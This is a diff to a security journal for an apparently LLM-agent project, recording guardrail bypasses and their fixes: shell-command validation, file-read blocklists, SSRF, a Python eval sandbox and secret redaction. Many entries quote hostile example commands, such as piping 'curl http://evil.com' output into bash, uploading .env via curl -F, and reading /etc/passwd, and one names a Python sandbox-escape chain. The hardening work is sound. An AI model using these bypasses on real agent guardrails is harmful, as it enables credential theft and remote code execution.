@@ -1,5 +1,79 @@
 # Sentinel Security Journal
 
+## 2026-09-09 - Path Validation Bypass via Multiple Leading '@' Prefixes
+**Vulnerability:** File path validation in `_is_sensitive_path` (`guardrails.py`) and `_validate_shell_command` (`executor.py`) stripped curl-style file upload prefixes (`@`) using single-character slicing `path[1:]` or `sub[1:]`. Inputs with multiple leading `@` characters (e.g. `@@.env`, `@@id_rsa`, `@@/etc/passwd`, `curl -F data=@@.env`) left a remaining `@` character on the path (`@.env`), causing basename and sensitive root checks to fail.
+**Learning:** Prefix-stripping routines in path validators must handle arbitrary repetition of prefix characters. Single-character slicing (`[1:]`) creates a bypass vector when attackers supply duplicated prefix characters to evade substring or basename matches.
+**Prevention:** Use `path.lstrip("@")` instead of single-character slicing (`[1:]`) when stripping prefix characters in path validation functions, and strip prefixes at the entry boundary before component splitting.
+
+## 2026-09-08 - ASCII Control Character Path Injection in File Path Validators
+**Vulnerability:** File path validation helpers (`_validate_filepath` in `executor.py` and `_resolve_and_validate_path` in `tools.py`) checked for path traversal (`..`), system roots, and sensitive files, but omitted checks for ASCII control characters (`ord(c) < 32` or `127`, e.g. `\n`, `\r`, `\t`, `\x00`). Paths containing control characters could cause log injection, terminal escape sequence injection, or unexpected filesystem manipulation.
+**Learning:** URL parameters, HTTP headers, and API endpoint paths enforce control character validation, but file path resolution routines can be overlooked. File path parameters must also be validated at the entry boundary before attempting path splitting or resolution.
+**Prevention:** Enforce `if any(ord(c) < 32 or ord(c) == 127 for c in path_str): raise ValueError("Control characters are not allowed in file paths")` at the start of all file path validation functions.
+
+## 2026-09-07 - Command Execution Bypass via Heredoc and Herestring Interpreter Redirection
+**Vulnerability:** Shell command validation in the Workflow Executor (`_validate_shell_command`) extracted subcommands and checked process substitution and pipeline operators, but allowed shell and language interpreters (`sh`, `bash`, `python3`, `node`) to execute inline code via heredoc (`<<`) or herestring (`<<<`) redirections (e.g., `python3 <<'EOF' ... EOF` or `sh <<<'echo hello'`).
+**Learning:** Checking for pipeline execution and process substitution is insufficient if input redirections (`<<` and `<<<`) are permitted when invoking interpreter runtimes. Heredocs and herestrings provide direct code execution channels into interpreters without creating piped processes or substitution blocks.
+**Prevention:** Detect heredoc (`<<`) and herestring (`<<<`) redirection operators when inspecting subcommands. If the outer command is an interpreter or shell runtime, raise a `PermissionError` to block execution bypasses.
+
+## 2026-09-06 - Un-synchronized CLI Guardrail Copy Syntax Errors and Security Drift
+**Vulnerability:** `sakthai-chat-cli/sakthai/agent/guardrails.py` had un-synchronized syntax changes leaving duplicate, dangling `if` statements in `_check_container_tokens` that caused an `IndentationError` when parsed. In addition, `sakthai-chat-cli`'s guardrails were not included in `tests/test_persona_guardrails_parity.py`, allowing guardrail logic and syntax errors to silently drift outside the persona parity sweeps.
+**Learning:** Monorepos containing separate package trees or standalone CLI distributions (such as `sakthai-chat-cli`) that duplicate security guardrails must be included in automated byte-parity tests alongside persona packages. Otherwise, security fixes and refactoring can cause syntax errors or security policy gaps in unmonitored copies.
+**Prevention:** Include all package-level copies of `guardrails.py` (including `sakthai-chat-cli/sakthai/agent/guardrails.py`) in `tests/test_persona_guardrails_parity.py` to enforce byte-identical security guardrails across the entire repository.
+
+## 2026-08-31 - Secret Leakage in Script Stderr Outputs on Request Errors
+**Vulnerability:** `discover_chat_id` in `scripts/telegram_send.py` printed invalid token strings and raw `urlopen` exception objects directly to `sys.stderr`. When connection failures or HTTP errors occurred, `URLError` exception representations contained full request URLs including the `TELEGRAM_BOT_TOKEN`, leaking credentials in log outputs.
+**Learning:** Utility scripts that perform HTTP requests targeting authenticated endpoints with tokens in URL paths must sanitize and redact secrets in exception handling and input validation branches before printing to standard error.
+**Prevention:** Register runtime secrets via `register_secret` and pass stringified exceptions through `redact_secrets` prior to stderr logging, with explicit substring token replacements as defense-in-depth fallbacks.
+
+## 2026-08-30 - Pipeline-to-Interpreter Bypass via Wrappers and Environment Variables
+**Vulnerability:** The Agent Workflow Framework executor's shell/command validation split pipelines by `|` and checked only the first word of the next segment. This was easily bypassed by wrapping the target interpreter in transparent wrappers (such as `env`, `sudo`, `timeout`, `pkexec`, `nohup`) or prepending environment variables (e.g., `env FOO=BAR python`), allowing command injection/execution of standard shell runtimes.
+**Learning:** Checking only the first word of a pipeline segment is insufficient to detect wrapped execution contexts. Wrappers and env vars act as "prefixes" that shift the actual executable token further down the line.
+**Prevention:** Implement an unwrapping scanner that processes segment tokens, recursively skipping flags, environment variable assignments, and known system/wrapper binaries to extract and validate the actual underlying command.
+
+## 2026-08-27 - Case-Sensitivity Bypass in Direct File Read Blockers
+**Vulnerability:** The defense-in-depth file-read blocker `_is_sensitive_read_target` in `tools.py` compared raw file names and directory components directly to lowercase blocklists (`_SENSITIVE_READ_BASENAMES` and `_SENSITIVE_READ_FRAGMENTS`). This allowed casing-based bypasses (such as reading `.ENV`, `Credentials.json`, or `.SSH/authorized_keys`) on case-insensitive filesystems, rendering the protection ineffective against non-lowercase inputs.
+**Learning:** Checking path-based constraints against static string lists or directory fragments must always normalize the requested paths case-insensitively. Simple casing discrepancies can trivially bypass security boundaries.
+**Prevention:** Convert all target filenames and path directory fragments to lowercase (`lower()`) prior to matching against case-normalized blocklists.
+
+## 2026-08-22 - Unprotected Shell/Command Actions in Agent Workflow Framework
+**Vulnerability:** The Agent Workflow Framework executor's shell/command actions had zero validation checks on their command inputs. This allowed any step to run arbitrary commands targeting system-critical or sensitive repository directories/files (e.g., `/etc/passwd`, `.env`, private keys), completely bypassing the directory containment and path-traversal checks enforced elsewhere in the filesystem and network tools.
+**Learning:** Hardening individual filesystem and network APIs is insufficient if general shell-execution or subcommand execution nodes operate in the same context without a command sanitization or validation filter.
+**Prevention:** Implement a recursive token-splitting and path-validation parser (e.g. `_validate_shell_command`) that splits any shell command string into tokens, decomposes complex flag-value delimiters (like `=`), and validates each resulting word or sub-token against central path-traversal and sensitive asset rules.
+
+## 2026-08-10 - Competing Hardening PRs Are a Regression Risk, Not Just Duplication
+**Vulnerability:** Five open PRs (#573/#574/#575/#577/#578) independently hardened the same python evaluation step in the Agent Workflow Framework executor. Each shipped a different `dangerous_builtins` set and none was a superset of the others: main already blocked 13 names, #573/#574/#575 blocked only 5-8 (merging any of them would have *removed* `exit`/`quit`/`vars`/`help` protection), while #577 uniquely added `getattr`/`setattr`/`delattr` and #578 uniquely added `hasattr`/`dir`/`type`/`object`/`super`/`property`/`classmethod`/`staticmethod` plus dunder stripping — but both dropped names main already had.
+**Learning:** With concurrent agent-authored security PRs, "merge them all" and "merge the newest" are both wrong: whichever lands last silently overwrites the others' protections, and a green diff review will not show it because each PR looks like a strict improvement against its own stale merge-base. Blocking only `open`/`__import__`/`eval`/`exec` is in any case insufficient — `getattr`, `type`, `object` and `super` each still reach `().__class__.__bases__[0].__subclasses__()` and from there `subprocess`.
+**Prevention:** Consolidate competing hardening PRs by folding the *union* of their protections onto the strongest existing implementation, never by sequential merge. Diff each branch against **current** main rather than its merge-base to see what it would actually change. Pin the union with a single regression test enumerating every proposal's payloads (`test_python_action_blocks_every_proposed_escape`), plus a companion test asserting ordinary expressions still evaluate, since a blocklist wide enough to stop `type`/`object` is also wide enough to break real workflows.
+
+## 2026-08-18 - SSRF Redirect Bypass in Agent Workflow Framework Fetch Action
+**Vulnerability:** The Agent Workflow Framework executor's fetch action validated the destination IP address of only the initial target URL, but then used standard `urllib.request.urlopen` to request it. Since `urllib` natively follows redirects by default, an attacker or a compromised server could return a redirect pointing to local/loopback or private address ranges (e.g., `http://127.0.0.1` or the cloud metadata service), completely bypassing the initial SSRF check.
+**Learning:** Checking the IP address of only the initial request URL is insufficient for protecting HTTP clients against SSRF when automatic redirects are enabled. Downstream redirect chains must be actively intercepted and validated at every hop before they are requested.
+**Prevention:** Subclass `urllib.request.HTTPRedirectHandler` and override `redirect_request(self, req, fp, code, msg, headers, newurl)` to call the centralized validation helper on `newurl` before returning. Instantiate the customized opener using `urllib.request.build_opener` specifically for any outgoing HTTP request action.
+
+## 2026-08-16 - Double/Multi-Layered URL Encoded relative path traversal in GraphClient
+**Vulnerability:** The GraphClient request path validation only unquoted the path once, allowing attackers or LLMs to bypass the path traversal check (`..`) by using double or multi-layered URL encoding (such as `%252e%252e%252f`).
+**Learning:** Downstream servers or HTTP clients may resolve paths by iteratively decoding them. Validating path containment with a single-level unquoting pass is insecure against multi-layered encoding bypasses.
+**Prevention:** Always recursively unquote/URL-decode user-supplied paths (e.g., up to 5 levels with early exit if no changes occur) before checking for relative traversal segments (`..`) or sensitive keywords.
+
+## 2026-08-15 - Unvalidated File IO in Agent Workflow Framework Executor
+**Vulnerability:** The Agent Workflow Framework executor's file actions (`file_read`, `file_write`) were entirely unvalidated, allowing complete local path traversal and arbitrary reading or writing of sensitive files (like `.env`, SSH keys, or system-critical `/etc/passwd`) without restriction.
+**Learning:** Adding complex system tools or workflow executors that support filesystem interactions creates a high-risk security gap if not accompanied by a centralized path-validation layer that strictly validates target paths before any filesystem IO is attempted.
+**Prevention:** Implement a centralized helper function `_validate_filepath` to resolve paths, check for path-traversal segments, block access to critical system directories, and reject attempts to access sensitive files/directories (credential basenames, `.git`, `.ssh`, etc.).
+
+## 2026-08-10 - SSRF and Token Exfiltration via HTTP Client Base URL Override
+**Vulnerability:** Under `httpx`, passing an absolute URL to a client configured with `base_url` overrides the base URL. If the client automatically appends authorization headers (like MS Graph Bearer tokens), calling raw/arbitrary endpoints with an untrusted absolute URL leaks the token to third-party domains.
+**Learning:** Never assume an HTTP client with a hardcoded `base_url` restricts requests strictly to that domain. Absolute URLs passed to request methods bypass the base prefix, creating Server-Side Request Forgery (SSRF) and credential exfiltration vectors.
+**Prevention:** Explicitly validate all absolute and protocol-relative URLs at the request entry boundary, ensuring they strictly use HTTPS and match the allowed target domains, while rejecting obfuscations like backslashes in absolute URLs.
+
+## 2026-08-04 - Tracking and Redacting Stripe and Twilio Credentials Symmetrically
+**Vulnerability:** Missing integration and redaction for Stripe and Twilio environment variables and consumer key format. Without explicit tracking and regex coverage, Stripe and Twilio secrets could leak in logs, database tables, and model interactions.
+**Learning:** Hardening of secret redaction mechanisms must explicitly map out domain-specific API tokens (such as Stripe consumer keys with the `ck_` prefix and Twilio API/auth variables) across all package layouts and persona-specific configurations to maintain comprehensive coverage.
+**Prevention:** Regularly audit and expand both `SECRET_PATTERN` (e.g., adding `ck_` patterns) and global configuration `secret_keys` to cover all active environment configurations, and symmetrically synchronize these updates across all physical persona directories and standalone CLIs.
+## 2026-08-09 - Vulnerable Cryptography Package Dependency
+**Vulnerability:** The pinned dependency `cryptography` was pinned to version `49.0.0` in `uv.lock`, which contained a known vulnerability (CVE-PYSEC-2026-3552) allowing potential cryptographic bypasses or security issues.
+**Learning:** Pinned locked dependencies can silently age and acquire published CVEs over time. Standard linting and code-checks won't flag these, which is why a weekly automated `dependency-audit` workflow in CI is essential to bridge the gap and enforce version upgrades.
+**Prevention:** Integrate and regularly run automated dependency audits (e.g., `uvx pip-audit` or `pip-audit`) against locked requirements files in CI, and upgrade pinned dependencies via package manager lock updates (`uv lock --upgrade-package <pkg>`) immediately when security advisories are released.
+
 ## 2025-07-26 - Empty Host Loopback Binding Bypass
 **Vulnerability:** Python's socket and HTTP/HTTPS servers treat an empty string `""` as `INADDR_ANY` (binding to all interfaces, equivalent to `0.0.0.0`). Classifying `""` as loopback-only allows unauthenticated servers to be exposed publicly to the network.
 **Learning:** Checking host values against `_LOOPBACK_NAMES = frozenset({"localhost", ""})` created a security loophole where passing `""` allowed the unauthenticated server to bypass the loopback restriction check and listen publicly on all interfaces.
@@ -90,14 +164,6 @@
 **Learning:** String-matching based security checks on CLI commands are fragile. Effective guardrails must parse the command (e.g., using `shlex`) and evaluate the semantic intent (recursive deletion) and the reach of the target (absolute or home-relative paths) across all possible flag variations.
 
 **Prevention:** Use robust flag detection that handles combined, individual, and long-form flags. Validate all positional arguments for sensitive path prefixes rather than matching exact strings.
-
-## 2026-07-06 - [Robust Command Binary Detection in Guardrails]
-
-**Vulnerability:** Destructive command guardrails (like the `rm` check) could be bypassed by using absolute paths to the binary (e.g., `/bin/rm` or `sudo /bin/rm`) because the detection logic only looked for exact string matches on the command name.
-
-**Learning:** When building security guardrails that inspect shell commands, simply checking for a command name is insufficient. Command aliases, absolute paths, and wrappers (like `sudo`) must be considered to prevent trivial bypasses.
-
-**Prevention:** Use matching logic that identifies a binary both by its base name and its path-prefixed forms (e.g., `part == "binary" or part.endswith("/binary")`). Ensure this check is applied even when commands are prefixed by administrative wrappers.
 
 ## 2026-07-05 - [Unified Security Enforcement for MCP Tools]
 
@@ -424,6 +490,11 @@
 
 **Prevention:** Implement recursive scanners (like `_contains_sensitive_path`) that inspect all iterable containers and dictionaries (both keys and values) to ensure no sensitive path lies embedded in any part of the tool payload.
 
+## 2026-08-06 - Hardening against Database and Shell History Exposure
+**Vulnerability:** Interactive shell and database history files (`.rediscli_history`, `.mongo_history`), database client password files (`.pgpass`), and database configurations (`.my.cnf`) were not blocked by guardrails. These contain highly sensitive database credentials, connection strings, or query histories which could be read or exfiltrated by an LLM agent.
+**Learning:** Hardening filesystem checks for generic credential paths must explicitly cover database and interactive client artifacts, as these files are frequently created in the user's home/current directory in developer environments and often store credentials in plain text.
+**Prevention:** Exhaustively register `.rediscli_history`, `.mongo_history`, `.pgpass`, and `.my.cnf` in `_SENSITIVE_BASENAMES` (for shell command guardrails) and `_SENSITIVE_READ_BASENAMES` (for direct file tool handlers) across all packages, verified by regression test coverage.
+
 ## 2026-08-02 - [Hardening Parameter Guardrails against Quoted and Serialized JSON Bypasses]
 
 **Vulnerability:** Filesystem-access and argument-based guardrails (like `_block_sensitive_path_args`) could be bypassed if a sensitive path was wrapped in quotes (e.g., `"/etc/shadow"`) inside malformed JSON-like strings, or if sensitive paths were nested inside serialized JSON string arguments that the tool-checking system treated as a single flat string.
@@ -446,3 +517,93 @@
 **Learning:** Standard security checks focusing on traditional shells (`bash`, `sh`, `python`, `node`) fail to capture modern developer runtimes and databases that have equal potential for destructive operations or raw file exfiltration.
 
 **Prevention:** Maintain exhaustive sets of monitored command-line runners, package managers, and database clients. Ensure they are systematically registered in the command scanner's exfiltration and interpreter blocks to enable recursive script and argument path validation.
+
+## 2026-08-08 - Hardening Guardrails against Database Clients, Editors, and Package Manager Bypasses
+**Vulnerability:** Shell execution guardrails could be bypassed by using standard system database clients (`psql`, `mysql`, `mariadb`, `mongo`, `mongosh`, `redis-cli`), text editors (`vim`, `vi`, `nano`, `emacs`, `ed`), and alternative package managers (`npm`, `cargo`, `composer`) to read/write/overwrite sensitive host files or run unmonitored inline command scripts.
+**Learning:** Hardening command-line validation requires expanding the list of monitored binaries beyond standard shells and common runners to encompass any pre-installed system administration, database client, or editing tools that support inline script execution or direct file interactions. Furthermore, package managers must be registered as transparent wrappers to recursively resolve nested command structures and option values (e.g. `--prefix`, `--manifest-path`, `--working-dir`).
+**Prevention:** Ensure that all database utilities, interactive text editors, and package managers are registered in exfiltration, destructive, and interpreter collections in `guardrails.py`, and implement robust option-skipping parser logic for their respective configuration flags.
+
+## 2026-08-09 - [Symmetry of Security Controls Between File-Read Blockers and Guardrails]
+**Vulnerability:** A symmetry gap existed where advanced shell/execution guardrails protected highly sensitive credentials (like post-quantum SSH XMSS keys, shell histories, git configurations, and database credentials) from shell exfiltration, but the file-reading tool's defense-in-depth blocker (`_SENSITIVE_READ_BASENAMES`) did not contain these keys. This left them vulnerable to raw reads if directories were allowlisted.
+**Learning:** Security controls must be symmetrically enforced across different execution layers (such as shell execution guardrails vs direct tool file-read handlers). A vulnerability in one layer can easily bypass protections in another if their definitions of "sensitive assets" diverge.
+**Prevention:** Always maintain unified or perfectly synchronized lists of sensitive basenames, private key stems, and credential files across all guardrail layers and file-reading tools. Write automated checks or comprehensive regression tests that cover identical files across both toolsets to prevent drift.
+
+## 2026-08-11 - Relative Path Traversal and API Version/Namespace Escape
+**Vulnerability:** A base-url configured HTTP client (e.g. MS Graph v1.0) can be coerced into accessing different API namespaces or versions (e.g. /beta/) if path arguments contain relative directory traversal segments like `..` or `/../`. Since absolute hostname controls only trigger on strings starting with `http`, relative traversal escapes bypass host checks while breaking out of the designated base-url subpath.
+**Learning:** Never assume base-url prefixes are structurally guaranteed boundaries. RFC relative-path merging naturally resolves dot-dot segments upward. To strictly enforce subpath confinement, paths must be explicitly segmented and scanned for any relative traversal segments before execution.
+**Prevention:** Segment the URL path part (both raw and URL-decoded, normalizing backslashes) and validate that no exact segment equals `..` or contains path-traversal sequences, rejecting requests that attempt to traverse outside the base path.
+
+## 2026-08-13 - Tracking and Redacting MS Graph/Teams Credentials Symmetrically
+**Vulnerability:** Lack of automatic configuration tracking and redaction for MS Graph and Microsoft Teams credentials. Without explicitly listing Azure and Office 365 environment variables like `MS_GRAPH_CLIENT_SECRET`, `MS_GRAPH_REFRESH_TOKEN`, and `MSGRAPH_CLIENT_SECRET`, active Graph/Teams credentials could be accidentally printed or leaked via console outputs, logs, or API endpoints.
+**Learning:** Security defense-in-depth tracking must comprehensively map out all credentials used by integrated external third-party services (such as MS Graph mail and calendar integrations) across all config environments and command-line execution guardrails.
+**Prevention:** Add all critical external API and refresh tokens/secrets to `secret_keys` lists in both `config.py` and `guardrails.py`, and symmetrically synchronize changes across all physical packages in the repository.
+
+## 2026-08-12 - Scheme-independent Absolute and Protocol-relative URL Detection to Prevent SSRF Bypass
+**Vulnerability:** Naive absolute URL detection that only checks if a string begins with `http` is vulnerable to Server-Side Request Forgery (SSRF) and credential exfiltration. An attacker can supply URLs with alternative or custom schemes (like `ftp://`, `ws://`, `gopher://`) or protocol-relative references (like `//attacker.com`) that bypass prefix matching but are still resolved as absolute by underlying HTTP clients.
+**Learning:** Any URI containing either a parsed `scheme` or a `netloc` (network location) is structurally absolute or protocol-relative. Security wrappers must use standard URL parsers to inspect both fields to intercept absolute targets, regardless of the scheme used.
+**Prevention:** Rather than string prefix matching, parse the URL using `urllib.parse.urlparse` and verify if `parsed.scheme` or `parsed.netloc` is populated. If so, enforce strict HTTPS schemes and whitelist host domains (e.g., `graph.microsoft.com`).
+
+## 2026-08-16 - Symmetrical Integration of credentials.json Across Tools and Guardrails
+**Vulnerability:** A symmetry gap existed where `credentials.json` (a common filename for service accounts and GCP API keys) was protected by the direct file-reading tool's defense-in-depth blocker (`_SENSITIVE_READ_BASENAMES` in `tools.py`), but was completely missing from `_SENSITIVE_BASENAMES` in `guardrails.py`. This permitted exfiltrating `credentials.json` via general shell commands (e.g. `cat credentials.json`, `curl -F data=@credentials.json`).
+**Learning:** File security protections must be symmetric across both direct reading tools and command execution guardrails. Discrepancies between the two allow attackers to bypass direct-read blocks by routing file access through shell commands or vice versa.
+**Prevention:** Symmetrically align sensitive file basenames across all tool types and guardrail specifications, verifying the protections through regression tests targeting both direct-read blocklists and command execution constraints.
+
+## 2026-08-17 - Dangerous Python Evaluation Execution Context and Escape Hatches
+**Vulnerability:** The Agent Workflow Framework's python evaluation step had direct, unrestricted access to the standard `__builtins__` namespace as well as the standard library modules `os` and `sys`. This allowed any workflow execution pipeline to completely bypass path traversal, system root, and SSRF restrictions by directly executing arbitrary commands via `os.system` or reading files via `open()`.
+**Learning:** Hardened validation rules on filesystem and network tools can be trivially bypassed if any generic evaluation/execution utility (like Python `eval` or `exec`) operates within a fully permissive or unvalidated environment, exposing critical APIs.
+**Prevention:** Always filter out dangerous, system-access builtins (such as `open`, `__import__`, `eval`, `exec`, `compile`, `exit`) and completely remove standard administrative library packages (like `os` and `sys`) from any custom dynamic evaluation runtime contexts.
+
+## 2026-08-17 - Unprotected Secrets in Deployment Bundles and Environment Files
+**Vulnerability:** Setup and VM deployment scripts (`setup_servicequotebot.py` and `setup_vm_telegram_agents.py`) generated `.env` configuration files containing active API keys and bot credentials with default system permissions (typically `0644`). This allowed any local user on the host machine to read raw secrets.
+**Learning:** Hardening of credentials must not be limited to active agent loops and databases; setup/deployment automation scripts that serialize credentials must explicitly lock down written file and directory permissions at the creation boundary.
+**Prevention:** Always restrict generated configuration directories containing credentials to `0o700` and sensitive environment/secret files to `0o600` immediately during creation, ensuring blocks are robust and wrapped with safe exception handling for cross-platform support.
+
+## 2026-08-20 - Unprotected MS Graph Credentials and Userinfo Exfiltration in MCP Server
+**Vulnerability:** The Microsoft Graph MCP client was vulnerable to possible leakage of MS Graph tenant ID, client secret, and access token within exception messages when tool requests failed. Additionally, absolute URLs passed to the request layer could contain embedded userinfo credentials (username/password), presenting a vector for credential harvesting.
+**Learning:** Even with robust path traversal and host checks, highly sensitive client-credentials and dynamic access tokens can be leaked in raw exception tracebacks and strings, or harvested via malformed absolute URLs. Security-first APIs must proactively redact sensitive internal properties from thrown exceptions and explicitly reject userinfo parameters in target absolute URLs.
+**Prevention:** Wrap request execution in a try-except block, sanitize exception strings in-place by updating `exc.args` via a robust regex/substring replacement of internal secrets (`self._client_secret`, `self._token`), and strictly reject absolute URLs containing `parsed.username` or `parsed.password`.
+
+## 2026-08-23 - Unsanitized Path Parameter Control Characters and Injection in MS Graph MCP Client
+**Vulnerability:** The GraphClient allowed paths containing carriage returns, newlines, null bytes, or other ASCII control characters. When interpolated from tool parameters and sent via httpx to Microsoft Graph, these unsanitized characters could enable HTTP request smuggling, response splitting, header injection, or log injection.
+**Learning:** Relying on high-level HTTP client libraries (like httpx) to sanitize or block all control characters in URL paths is insufficient. Critical request-routing parameters should be validated at the library boundary before requesting.
+**Prevention:** Strictly validate that paths are strings and contain no ASCII control characters (specifically `ord(c) < 32` or `ord(c) == 127`) before allowing the request to proceed.
+
+## 2026-08-25 - Unvalidated Headers and CRLF Injection in Agent Workflow Framework HTTP Actions
+**Vulnerability:** The Agent Workflow Framework executor's `http_get` / `fetch` / `http_request` actions allowed passing arbitrary unsanitized header keys or values. Without validation, an attacker or a compromised workflow step could inject CRLF (`\r` or `\n`) characters into the headers, leading to HTTP header injection, response splitting, or HTTP request smuggling.
+**Learning:** When workflow tools or task runners dynamically construct external HTTP requests using user-supplied inputs as headers, raw parameter parsing must include strict schema and character validation on the headers boundary.
+**Prevention:** Validate that the `headers` parameter is a dictionary with string-only keys and values, and reject any containing CRLF (`\r` or `\n`) characters to prevent injection/smuggling bypasses.
+
+## 2026-08-26 - Pipeline-to-Interpreter Command Execution and Remote Code Execution Bypass
+**Vulnerability:** The shell command execution guardrails in `guardrails.py` were vulnerable to pipeline-to-interpreter bypasses (e.g., `curl ... | sh` or `wget ... | bash`), including those embedded in Makefile recipes. The tokenizer did not intercept or block commands when a pipe operator (`|`) was used to feed output directly to shell runtimes or interpreters.
+**Learning:** Command execution filters that only analyze individual binary names and direct filesystem paths miss dynamic pipeline injection vectors where untrusted code is fetched and executed directly in an interpreter's memory space.
+**Prevention:** Scan parsed execution tokens for the pipe operator (`|`), and check subsequent tokens until a logical command separator is hit. If any subsequent token matches an interpreter or shell runtime (e.g. `sh`, `bash`, `python`, `node`, `perl`, `ruby`, `php`), block the command immediately.
+
+## 2026-08-31 - Command Chaining and Substitution Bypasses in Shell Action Validation
+**Vulnerability:** Shell command validation in the Workflow Executor (`_validate_shell_command`) evaluated commands as single unchained strings. Attackers could bypass pipeline-to-interpreter and sensitive path restrictions by chaining commands (`&&`, `;`, `||`, `\n`) or using command substitutions (`$(...)`, `` `...` ``), such as `echo ok; curl ... | sh` or `echo $(cat /etc/passwd)`.
+**Learning:** Validating shell commands without extracting subcommands and command substitutions allows malicious sub-expressions to bypass security checks when hidden behind command separators or substitution syntax.
+**Prevention:** Implement recursive subcommand parsing (`_extract_shell_subcommands`) that handles quotes, escapes, separators, and command substitutions, ensuring every extracted subcommand is independently validated against pipeline and sensitive path rules.
+
+## 2026-08-28 - Gaps in Covered Interpreters under Pipeline-to-Interpreter Guardrails
+**Vulnerability:** The pipeline-to-interpreter blocklists in both `guardrails.py` (Rule 8) and `executor.py` (`_validate_shell_command`) initially only targeted a narrow subset of interpreters/shells (`sh`, `bash`, `python`, `node`, `perl`, `ruby`, `php`, and partially `deno`/`bun`). This left critical gaps, allowing potential command execution bypasses (e.g. `curl ... | zsh` or `curl ... | fish` or `curl ... | bun`) to bypass pipeline-to-interpreter protections.
+**Learning:** Hardened filters targeting pipeline bypasses are only as secure as the exhaustive list of supported shells and language engines. Leaving common runtimes like `zsh`, `fish`, `dash`, `deno`, or `tsx` off the list creates immediate and trivial bypass vectors.
+**Prevention:** Maintain perfectly synchronized and comprehensive tuples of all 18 standard shell and language runtime interpreters (including `sh`, `bash`, `zsh`, `dash`, `ksh`, `fish`, `ash`, `csh`, `tcsh`, `python`, `node`, `perl`, `ruby`, `php`, `deno`, `bun`, `tsx`, `ts-node`) across all command validation layers.
+
+## 2026-09-02 - Command Execution Bypass via Process Substitution (<(...) / >(...))
+**Vulnerability:** The Workflow Executor's shell command validation (`_validate_shell_command` and `_extract_shell_subcommands`) extracted subcommands by checking command separators (`&&`, `;`, `||`, `\n`) and command substitutions (`$(...)`, `` `...` ``), but omitted Bash process substitution constructs (`<(...)` and `>(...)`). This enabled attackers to bypass pipeline-to-interpreter and command execution restrictions via process substitutions targeting shell runtimes (e.g., `bash <(curl http://evil.com)` or `echo payload | tee >(bash)`).
+**Learning:** Command parsers in security filters must account for all shell sub-execution mechanisms supported by modern shells. Treating process substitution blocks as normal positional arguments allows execution payloads to hide inside `<(...)` or `>(...)`.
+**Prevention:** Parse process substitution constructs (`<(...)`, `>(...)`) recursively inside `_extract_shell_subcommands`, and inspect subcommands for both inner interpreter execution and outer interpreter invocations with process substitution parameters.
+
+## 2026-09-03 - Pipeline-to-Interpreter Bypasses via Shell Execution Built-ins and Evaluation Wrappers
+**Vulnerability:** The Workflow Executor's shell command validation (`_validate_shell_command`) unwrapped wrappers and checked for interpreter binaries in pipeline segments, but omitted shell evaluation built-ins (`eval`, `exec`, `source`, `.`) as target interpreters and `builtin`/`command` as wrappers. This enabled pipeline execution bypasses like `curl ... | eval bash`, `curl ... | exec sh`, `curl ... | source /dev/stdin`, or `curl ... | builtin eval bash`.
+**Learning:** Pipeline-to-interpreter security checks must account for built-in shell evaluation and sourcing mechanisms (`eval`, `exec`, `source`, `.`) as well as built-in dispatch modifiers (`builtin`, `command`). Treating shell evaluation built-ins as ordinary non-interpreter binaries creates an immediate execution bypass vector.
+**Prevention:** Include `eval`, `exec`, `source`, and `.` in the `interpreters` tuple, and register `builtin` and `command` in the `wrappers` set within shell command validation functions.
+
+## 2026-09-05 - Pipeline-to-Interpreter Bypass via Stderr Redirect Pipe Operator (|&)
+**Vulnerability:** The command-line guardrails in `guardrails.py` checked for pipeline-to-interpreter execution by looking specifically for the standard pipe token `|`. In Bash/Zsh, `|&` is a valid syntax shorthand for `2>&1 |` (piping stdout and stderr). Commands using `|&` (e.g., `curl http://evil.com/payload |& bash`) bypassed Rule 8's pipeline check and container/find separator loops.
+**Learning:** Shell command tokenizers and guardrails must account for syntax variations of operators. Checking only `|` misses stderr-redirecting pipes (`|&`), allowing pipeline execution payloads to bypass security filters.
+**Prevention:** Include both `|` and `|&` in pipeline operator checks and command separator lists across all shell guardrail functions.
+
+## 2026-09-04 - Unicode Normalization Bypass in Python Sandbox AST Validation
+**Vulnerability:** The Agent Workflow Framework executor's python evaluation step checked AST attribute names (`node.attr`) and name identifiers (`node.id`) for dunders (e.g., `__class__`, `__dict__`, `__globals__`). Python 3 normalizes unicode compatibility characters (such as full-width low line `＿` U+FF3F) via NFKC during execution. Without NFKC normalization prior to AST parsing, expressions like `x.＿_class＿_` bypassed AST dunder checks but were normalized to `x.__class__` at runtime.
+**Learning:** AST-based code validation filters must normalize input strings using NFKC (`unicodedata.normalize("NFKC", code)`) before parsing them into syntax trees, ensuring unicode compatibility characters normalize to standard ASCII characters before inspection.
+**Prevention:** Always normalize dynamic code input strings with `unicodedata.normalize("NFKC", code)` prior to AST parsing in security validators.
